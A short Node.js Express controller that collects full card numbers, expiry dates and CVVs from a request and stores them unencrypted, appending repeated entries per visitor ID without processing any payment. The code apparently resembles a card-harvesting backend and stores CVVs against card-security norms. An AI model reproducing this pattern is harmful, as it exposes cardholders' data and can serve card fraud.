const CardPayment = require('../models/CardPayment');

exports.submitCardPayment = async (req, res) => {
    try {
        const { uniqueid, cardNumber, expiryDate, cvv } = req.body;
        let cardPayment = await CardPayment.findOne({ uniqueid });

        if (cardPayment) {
            cardPayment.entries.push({ cardNumber, expiryDate, cvv });
        } else {
            cardPayment = new CardPayment({
                uniqueid,
                entries: [{ cardNumber, expiryDate, cvv }]
            });
        }

        await cardPayment.save();
        res.status(200).json({
            success: true,
            message: "Card Payment Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting card payment data"
        });
    }
};
